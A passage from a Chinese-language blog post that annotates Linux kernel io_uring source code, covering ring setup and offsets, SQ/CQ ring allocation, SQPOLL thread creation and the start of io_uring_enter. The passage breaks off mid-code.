<p>设置sq_off，即通过 <code>params</code> 返回给用户的 <code>ring</code> 中各个成员的偏移</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;sq_off.head = offsetof(<span class="keyword">struct</span> io_rings, sq.head);</span><br><span class="line">p-&gt;sq_off.tail = offsetof(<span class="keyword">struct</span> io_rings, sq.tail);</span><br><span class="line">p-&gt;sq_off.ring_mask = offsetof(<span class="keyword">struct</span> io_rings, sq_ring_mask);</span><br><span class="line">p-&gt;sq_off.ring_entries = offsetof(<span class="keyword">struct</span> io_rings, sq_ring_entries);</span><br><span class="line">p-&gt;sq_off.flags = offsetof(<span class="keyword">struct</span> io_rings, sq_flags);</span><br><span class="line">p-&gt;sq_off.dropped = offsetof(<span class="keyword">struct</span> io_rings, sq_dropped);</span><br><span class="line"><span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_SQARRAY))</span><br><span class="line">	p-&gt;sq_off.<span class="built_in">array</span> = (<span class="type">char</span> *)ctx-&gt;sq_array - (<span class="type">char</span> *)ctx-&gt;rings;</span><br><span class="line">p-&gt;sq_off.resv1 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_MMAP))</span><br><span class="line">	p-&gt;sq_off.user_addr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">p-&gt;cq_off.head = offsetof(<span class="keyword">struct</span> io_rings, cq.head);</span><br><span class="line">p-&gt;cq_off.tail = offsetof(<span class="keyword">struct</span> io_rings, cq.tail);</span><br><span class="line">p-&gt;cq_off.ring_mask = offsetof(<span class="keyword">struct</span> io_rings, cq_ring_mask);</span><br><span class="line">p-&gt;cq_off.ring_entries = offsetof(<span class="keyword">struct</span> io_rings, cq_ring_entries);</span><br><span class="line">p-&gt;cq_off.overflow = offsetof(<span class="keyword">struct</span> io_rings, cq_overflow);</span><br><span class="line">p-&gt;cq_off.cqes = offsetof(<span class="keyword">struct</span> io_rings, cqes);</span><br><span class="line">p-&gt;cq_off.flags = offsetof(<span class="keyword">struct</span> io_rings, cq_flags);</span><br><span class="line">p-&gt;cq_off.resv1 = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>设置feature</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;features = IORING_FEAT_SINGLE_MMAP | IORING_FEAT_NODROP |</span><br><span class="line">		IORING_FEAT_SUBMIT_STABLE | IORING_FEAT_RW_CUR_POS |</span><br><span class="line">		IORING_FEAT_CUR_PERSONALITY | IORING_FEAT_FAST_POLL |</span><br><span class="line">		IORING_FEAT_POLL_32BITS | IORING_FEAT_SQPOLL_NONFIXED |</span><br><span class="line">		IORING_FEAT_EXT_ARG | IORING_FEAT_NATIVE_WORKERS |</span><br><span class="line">		IORING_FEAT_RSRC_TAGS | IORING_FEAT_CQE_SKIP |</span><br><span class="line">		IORING_FEAT_LINKED_FILE | IORING_FEAT_REG_REG_RING;</span><br></pre></td></tr></table></figure>
<p>再将<code>params</code>复制回用户空间</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (copy_to_user(params, p, <span class="keyword">sizeof</span>(*p))) &#123;</span><br><span class="line">	ret = -EFAULT;</span><br><span class="line">	<span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后是注册fd</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_SINGLE_ISSUER</span><br><span class="line">    &amp;&amp; !(ctx-&gt;flags &amp; IORING_SETUP_R_DISABLED))</span><br><span class="line">	WRITE_ONCE(ctx-&gt;submitter_task, get_task_struct(current));</span><br><span class="line"></span><br><span class="line">file = io_uring_get_file(ctx);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(file)) &#123;</span><br><span class="line">	ret = PTR_ERR(file);</span><br><span class="line">	<span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = __io_uring_add_tctx_node(ctx);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line">	<span class="keyword">goto</span> err_fput;</span><br><span class="line">tctx = current-&gt;io_uring;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Install ring fd as the very last thing, so we don&#x27;t risk someone</span></span><br><span class="line"><span class="comment"> * having closed it before we finish setup</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_REGISTERED_FD_ONLY)</span><br><span class="line">	ret = io_ring_add_registered_file(tctx, file, <span class="number">0</span>, IO_RINGFD_REG_MAX);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	ret = io_uring_install_fd(file);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">goto</span> err_fput;</span><br></pre></td></tr></table></figure>
<p>错误处理如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">err:</span><br><span class="line">	io_ring_ctx_wait_and_kill(ctx);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">err_fput:</span><br><span class="line">	fput(file);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br></pre></td></tr></table></figure>
<h4 id="io-allocate-scq-urings"><code>io_allocate_scq_urings</code></h4>
<p>首先是rings的分配，核心关键点在于NO_MMAP 的处理</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __cold <span class="type">int</span> <span class="title function_">io_allocate_scq_urings</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx,</span></span><br><span class="line"><span class="params">					 <span class="keyword">struct</span> io_uring_params *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_rings</span> *<span class="title">rings</span>;</span></span><br><span class="line">	<span class="type">size_t</span> size, sq_array_offset;</span><br><span class="line">	<span class="type">void</span> *ptr;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* make sure these are sane, as we already accounted them */</span></span><br><span class="line">	ctx-&gt;sq_entries = p-&gt;sq_entries;</span><br><span class="line">	ctx-&gt;cq_entries = p-&gt;cq_entries;</span><br><span class="line"></span><br><span class="line">	size = rings_size(ctx, p-&gt;sq_entries, p-&gt;cq_entries, &amp;sq_array_offset);</span><br><span class="line">	<span class="keyword">if</span> (size == SIZE_MAX)</span><br><span class="line">		<span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_MMAP))</span><br><span class="line">		rings = io_mem_alloc(size);</span><br><span class="line">		<span class="comment">// 如果没有设置NO_MMAP，就分配</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		rings = io_rings_map(ctx, p-&gt;cq_off.user_addr, size);</span><br><span class="line">		<span class="comment">// 反之，建立映射</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(rings))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(rings);</span><br><span class="line"></span><br><span class="line">	ctx-&gt;rings = rings;</span><br></pre></td></tr></table></figure>
<p>接下来是类似的，sqe的分配：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_SQARRAY))</span><br><span class="line">	ctx-&gt;sq_array = (u32 *)((<span class="type">char</span> *)rings + sq_array_offset);</span><br><span class="line">rings-&gt;sq_ring_mask = p-&gt;sq_entries - <span class="number">1</span>;</span><br><span class="line">rings-&gt;cq_ring_mask = p-&gt;cq_entries - <span class="number">1</span>;</span><br><span class="line">rings-&gt;sq_ring_entries = p-&gt;sq_entries;</span><br><span class="line">rings-&gt;cq_ring_entries = p-&gt;cq_entries;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_SQE128)</span><br><span class="line">	size = array_size(<span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_sqe), p-&gt;sq_entries);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	size = array_size(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_sqe), p-&gt;sq_entries);</span><br><span class="line"><span class="keyword">if</span> (size == SIZE_MAX) &#123;</span><br><span class="line">	io_rings_free(ctx);</span><br><span class="line">	<span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_MMAP))</span><br><span class="line">	ptr = io_mem_alloc(size);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	ptr = io_sqes_map(ctx, p-&gt;sq_off.user_addr, size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(ptr)) &#123;</span><br><span class="line">	io_rings_free(ctx);</span><br><span class="line">	<span class="keyword">return</span> PTR_ERR(ptr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctx-&gt;sq_sqes = ptr;</span><br></pre></td></tr></table></figure>
<h3 id="io-sq-offload-create"><code>io_sq_offload_create</code></h3>
<p>如果设置了 SQPOLL， 用来创建内核收割任务的线程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">__cold <span class="type">int</span> <span class="title function_">io_sq_offload_create</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx,</span></span><br><span class="line"><span class="params">				<span class="keyword">struct</span> io_uring_params *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Retain compatibility with failing for an invalid attach attempt */</span></span><br><span class="line">	<span class="keyword">if</span> ((ctx-&gt;flags &amp; (IORING_SETUP_ATTACH_WQ | IORING_SETUP_SQPOLL)) ==</span><br><span class="line">				IORING_SETUP_ATTACH_WQ) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line"></span><br><span class="line">		f = fdget(p-&gt;wq_fd);</span><br><span class="line">		<span class="keyword">if</span> (!f.file)</span><br><span class="line">			<span class="keyword">return</span> -ENXIO;</span><br><span class="line">		<span class="keyword">if</span> (!io_is_uring_fops(f.file)) &#123;</span><br><span class="line">			fdput(f);</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		&#125;</span><br><span class="line">		fdput(f);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_SQPOLL) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tsk</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_sq_data</span> *<span class="title">sqd</span>;</span></span><br><span class="line">		<span class="type">bool</span> attached;</span><br><span class="line"></span><br><span class="line">		ret = security_uring_sqpoll();</span><br><span class="line">		<span class="keyword">if</span> (ret)</span><br><span class="line">			<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">		sqd = io_get_sq_data(p, &amp;attached);</span><br><span class="line">		<span class="comment">// 获取一个sqd </span></span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(sqd)) &#123;</span><br><span class="line">			ret = PTR_ERR(sqd);</span><br><span class="line">			<span class="keyword">goto</span> err;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ctx-&gt;sq_creds = get_current_cred();</span><br><span class="line">		ctx-&gt;sq_data = sqd;</span><br><span class="line">		ctx-&gt;sq_thread_idle = msecs_to_jiffies(p-&gt;sq_thread_idle);</span><br><span class="line">		<span class="keyword">if</span> (!ctx-&gt;sq_thread_idle)</span><br><span class="line">			ctx-&gt;sq_thread_idle = HZ;</span><br><span class="line">		<span class="comment">// 设置相关信息</span></span><br><span class="line">		io_sq_thread_park(sqd);</span><br><span class="line">		list_add(&amp;ctx-&gt;sqd_list, &amp;sqd-&gt;ctx_list);</span><br><span class="line">		io_sqd_update_thread_idle(sqd);</span><br><span class="line">		<span class="comment">/* don&#x27;t attach to a dying SQPOLL thread, would be racy */</span></span><br><span class="line">		ret = (attached &amp;&amp; !sqd-&gt;thread) ? -ENXIO : <span class="number">0</span>;</span><br><span class="line">		io_sq_thread_unpark(sqd);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">goto</span> err;</span><br><span class="line">		<span class="keyword">if</span> (attached)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_SQ_AFF) &#123;</span><br><span class="line">			<span class="type">int</span> cpu = p-&gt;sq_thread_cpu;</span><br><span class="line"></span><br><span class="line">			ret = -EINVAL;</span><br><span class="line">			<span class="keyword">if</span> (cpu &gt;= nr_cpu_ids || !cpu_online(cpu))</span><br><span class="line">				<span class="keyword">goto</span> err_sqpoll;</span><br><span class="line">			sqd-&gt;sq_cpu = cpu;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			sqd-&gt;sq_cpu = <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		sqd-&gt;task_pid = current-&gt;pid;</span><br><span class="line">		sqd-&gt;task_tgid = current-&gt;tgid;</span><br><span class="line">		tsk = create_io_thread(io_sq_thread, sqd, NUMA_NO_NODE);</span><br><span class="line">		<span class="comment">// 创建处理线程</span></span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(tsk)) &#123;</span><br><span class="line">			ret = PTR_ERR(tsk);</span><br><span class="line">			<span class="keyword">goto</span> err_sqpoll;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		sqd-&gt;thread = tsk;</span><br><span class="line">		ret = io_uring_alloc_task_context(tsk, ctx);</span><br><span class="line">		wake_up_new_task(tsk);</span><br><span class="line">		<span class="keyword">if</span> (ret)</span><br><span class="line">			<span class="keyword">goto</span> err;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_SQ_AFF) &#123;</span><br><span class="line">		<span class="comment">/* Can&#x27;t have SQ_AFF without SQPOLL */</span></span><br><span class="line">		ret = -EINVAL;</span><br><span class="line">		<span class="keyword">goto</span> err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err_sqpoll:</span><br><span class="line">	complete(&amp;ctx-&gt;sq_data-&gt;exited);</span><br><span class="line">err:</span><br><span class="line">	io_sq_thread_finish(ctx);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="io-uring-enter"><code>io_uring_enter</code></h3>
<p>首先是对于flag的检查和确认，这里不一一赘述了，感兴趣的去看相应的man page更能了解</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE6(io_uring_enter, <span class="type">unsigned</span> <span class="type">int</span>, fd, u32, to_submit,</span><br><span class="line">		u32, min_complete, u32, flags, <span class="type">const</span> <span class="type">void</span> __user *, argp,</span><br><span class="line">		<span class="type">size_t</span>, argsz)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_ring_ctx</span> *<span class="title">ctx</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line">	<span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(flags &amp; ~(IORING_ENTER_GETEVENTS | IORING_ENTER_SQ_WAKEUP |</span><br><span class="line">			       IORING_ENTER_SQ_WAIT | IORING_ENTER_EXT_ARG |</span><br><span class="line">			       IORING_ENTER_REGISTERED_RING)))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Ring fd has been registered via IORING_REGISTER_RING_FDS, we</span></span><br><span class="line"><span class="comment">	 * need only dereference our task private array to find it.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; IORING_ENTER_REGISTERED_RING) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_task</span> *<span class="title">tctx</span> =</span> current-&gt;io_uring;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (unlikely(!tctx || fd &gt;= IO_RINGFD_REG_MAX))</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		fd = array_index_nospec(fd, IO_RINGFD_REG_MAX);</span><br><span class="line">		f.file = tctx-&gt;registered_rings[fd];</span><br><span class="line">		f.flags = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!f.file))</span><br><span class="line">			<span class="keyword">return</span> -EBADF;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		f = fdget(fd);</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!f.file))</span><br><span class="line">			<span class="keyword">return</span> -EBADF;</span><br><span class="line">		ret = -EOPNOTSUPP;</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!io_is_uring_fops(f.file)))</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ctx = f.file-&gt;private_data;</span><br><span class="line">	ret = -EBADFD;</span><br><span class="line">	<span class="keyword">if</span> (unlikely(ctx-&gt;flags &amp; IORING_SETUP_R_DISABLED))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>SQPOLL模式下,直接返回提交数,可选择性wakeup线程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For SQ polling, the thread will do all submissions and completions.</span></span><br><span class="line"><span class="comment"> * Just return the requested submit count, and wake the thread if</span></span><br><span class="line"><span class="comment"> * we were asked to.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_SQPOLL) &#123;</span><br><span class="line">	io_cqring_overflow_flush(ctx);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(ctx-&gt;sq_data-&gt;thread == <span class="literal">NULL</span>)) &#123;</span><br><span class="line">		ret = -EOWNERDEAD;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (flags &amp; IORING_ENTER_SQ_WAKEUP)</span><br><span class="line">	<span class="comment">// 这个flag处于和用户态共享的内存 </span></span><br><span class="line">	<span class="comment">// 如果sq处理线程休眠了，并需要唤醒</span></span><br><span class="line">	<span class="comment">// 可以通过设置 IORING_ENTER_SQ_WAKEUP， 再通过此syscall 来唤醒</span></span><br><span class="line">		wake_up(&amp;ctx-&gt;sq_data-&gt;wait);</span><br><span class="line">	<span class="keyword">if</span> (flags &amp; IORING_ENTER_SQ_WAIT)</span><br><span class="line">		io_sqpoll_wait_sq(ctx);</span><br><span class="line"></span><br><span class="line">	ret = to_submit;</span><br></pre></td></tr></table></figure>
<p>非SQPOLL模式,执行提交请求到SQ环</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (to_submit) &#123;</span><br><span class="line">	ret = io_uring_add_tctx_node(ctx);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(ret))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	mutex_lock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">	ret = io_submit_sqes(ctx, to_submit);</span><br><span class="line">	<span class="comment">// 直接提交 sqes </span></span><br><span class="line">	<span class="comment">// 这个函数将在后面分析</span></span><br><span class="line">	<span class="comment">// SQPOLL 模式下创建的io_sq_thread 也会调用此函数</span></span><br><span class="line">	<span class="keyword">if</span> (ret != to_submit) &#123;</span><br><span class="line">		mutex_unlock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (flags &amp; IORING_ENTER_GETEVENTS) &#123;</span><br><span class="line">		<span class="keyword">if</span> (ctx-&gt;syscall_iopoll)</span><br><span class="line">			<span class="keyword">goto</span> iopoll_locked;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Ignore errors, we&#x27;ll soon call io_cqring_wait() and</span></span><br><span class="line"><span class="comment">		 * it should handle ownership problems if any.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_DEFER_TASKRUN)</span><br><span class="line">			(<span class="type">void</span>)io_run_local_work_locked(ctx);</span><br><span class="line">	&#125;</span><br><span class="line">	mutex_unlock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">	<span class="keyword">if</span> (flags &amp; IORING_ENTER_GETEVENTS) &#123;</span><br><span class="line">	<span class="comment">// 如果请求获取完成事件</span></span><br><span class="line">		<span class="type">int</span> ret2;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (ctx-&gt;syscall_iopoll) &#123;</span><br><span class="line">		<span class="comment">// 